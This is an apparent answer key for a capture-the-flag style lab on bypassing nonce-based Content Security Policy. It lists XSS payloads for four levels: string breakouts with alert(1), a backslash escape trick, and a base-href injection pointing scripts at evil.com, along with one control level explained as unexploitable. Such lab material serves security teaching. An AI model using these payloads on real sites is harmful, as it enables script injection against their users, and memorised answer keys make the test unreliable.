# nonce — solutions

CSP nonce-based protections bypassed via injection inside trusted contexts.

### nonce-level1

`/nonce/level1/?query=%22%3Balert(1)%2F%2F`

- payload: `";alert(1)//`
- context: inside nonced <script> string var x="QUERY"; break string

### nonce-level2

`/nonce/level2/?query=%27)%3Balert(1)%2F%2F`

- payload: `no payload — control`
- context: the value breaks out of an `onclick="handle('...')"` call, but the CSP
  is `script-src 'nonce-X' 'unsafe-hashes'` with no hash source listed, so
  `'unsafe-hashes'` enables nothing and the inline `onclick` never runs — an
  injected handler or script is blocked too, and the nonce is random per response
  (verified: a `');fetch('/beacon/...')//` payload reached no JS sink while a
  control endpoint fired through the same harness). Reporting no XSS is correct.

### nonce-level3

`/nonce/level3/?query=https%3A%2F%2Fevil.com%2F`

- payload: `https://evil.com/`
- context: <base href="QUERY"> with script-src 'self'; redirect relative src

### nonce-level4

`/nonce/level4/?query=%5C%27%3Balert(1)%2F%2F`

- payload: `\';alert(1)//`
- context: single-quote string, only ' escaped (not \); `\\'` leaves quote unescaped
